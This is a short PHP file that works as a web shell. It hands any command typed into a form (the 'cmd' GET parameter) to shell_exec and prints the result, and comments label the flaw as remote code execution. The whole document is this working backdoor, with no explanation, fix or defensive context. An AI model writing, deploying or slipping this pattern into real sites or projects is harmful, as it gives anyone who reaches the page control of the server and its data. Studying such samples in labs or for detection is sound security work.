<?php
// Remote Code Execution (RCE) via user input
if (isset($_GET['cmd'])) {
    $output = shell_exec($_GET['cmd']); // RCE
    echo "<pre>$output</pre>";
}
?>
<form method="get">
    <input name="cmd" placeholder="Enter shell command">
    <input type="submit" value="Run">
</form>
